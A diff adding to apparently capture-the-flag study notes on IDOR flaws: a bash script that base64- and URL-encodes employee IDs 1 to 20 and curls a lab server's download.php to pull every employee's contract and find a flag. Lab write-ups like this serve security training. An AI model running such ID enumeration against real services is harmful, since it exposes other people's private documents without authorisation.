@@ -33,6 +33,21 @@ done
 ## Bypassing Encoded References
 
 >**Q. Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.**
+```sh
+sudo nano encode.sh
+sudo chmod +x encode.sh
+```
+```sh
+#!/bin/bash
+
+
+for i in {1..20}; do
+    for hash in $( (echo -n $i | base64 -w 0) |jq -sRr @uri); do
+        curl -s "http://83.136.250.34:36131/download.php?contract=$hash"
+    done
+done
+```
+
 
 ## IDOR in Insecure APIs
 
